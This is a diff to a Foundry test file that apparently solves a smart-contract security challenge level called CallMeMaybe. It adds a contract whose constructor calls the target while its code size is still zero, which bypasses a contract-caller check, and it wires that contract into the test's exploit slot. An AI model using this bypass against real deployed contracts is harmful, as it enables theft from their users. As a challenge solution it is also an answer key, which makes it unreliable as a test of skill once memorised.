@@ -4,6 +4,16 @@ pragma solidity ^0.8.25;
 import "./BaseTest.t.sol";
 import "src/05_CallMeMaybe/CallMeMaybe.sol";
 
+contract ExploitCallMeMaybe {
+    constructor(CallMeMaybe callMe) {
+        // Call the hereIsMyNumber() from this contract's constructor.
+        // At the time of calling, extcodesize(this) will be 0, since the contract is not fully deployed yet.
+        // And tx.origin != msg.sender, because code was called from contract and not from user
+        
+        callMe.hereIsMyNumber();
+    }
+}
+
 // forge test --match-contract CallMeMaybeTest -vvvv
 contract CallMeMaybeTest is BaseTest {
     CallMeMaybe instance;
@@ -15,8 +25,7 @@ contract CallMeMaybeTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
-
+        ExploitCallMeMaybe exploit = new ExploitCallMeMaybe(instance);
         checkSuccess();
     }
 
